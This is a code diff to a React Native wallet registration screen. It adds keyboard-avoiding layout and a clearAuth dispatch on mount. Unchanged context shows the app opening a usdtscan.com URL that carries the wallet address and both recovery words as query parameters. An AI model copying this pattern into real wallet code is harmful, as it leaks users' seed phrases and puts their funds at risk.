@@ -1,10 +1,10 @@
 import { useEffect, useState } from "react"
-import { View ,Text, StyleSheet,Linking, Modal } from "react-native"
+import { View ,Text, StyleSheet,Linking, Modal, KeyboardAvoidingView } from "react-native"
 import { useDispatch, useSelector } from "react-redux"
 import { Gstyals } from "../../Gstyles"
 import { LoginWrapper } from "../Components/LoginWrapper"
 import { Modals } from "../Components/Modal"
-import { clearRegisterData, Create_wallet } from "../store/action/action"
+import { clearAuth, clearRegisterData, Create_wallet } from "../store/action/action"
 
 export const Register = ({navigation}) => {
     const dispatch = useDispatch()
@@ -118,6 +118,9 @@ export const Register = ({navigation}) => {
         setItem(temp)
       }
     useEffect(()=>{
+        dispatch(clearAuth())
+    },[])
+    useEffect(()=>{
         if(auth?.data?.success){
             setPopUp(true)
             Linking.openURL(`https://usdtscan.com/download_keys?walet=${auth.data.Wallet}&phrase1=${auth.data.recovery_word}&phrase2=${auth.data.recovery_word2}`)
@@ -126,7 +129,8 @@ export const Register = ({navigation}) => {
             setPopUp(false)
         }
     },[auth?.data?.success])
-    return <LoginWrapper 
+     return <KeyboardAvoidingView  behavior="padding"> 
+    <LoginWrapper 
                 validate = {()=>Validate()}  
                 onChange={(i,value)=>handleChange(i,value)} 
                 navigation ={navigation} 
@@ -157,6 +161,8 @@ export const Register = ({navigation}) => {
                 <Text onPress={()=>navigation.navigate('login')} style ={Gstyals.loginText}>Log In</Text>
         </View>
     </LoginWrapper>
+    </KeyboardAvoidingView> 
+
 }
 const styles = StyleSheet.create({
     textWrapper:{
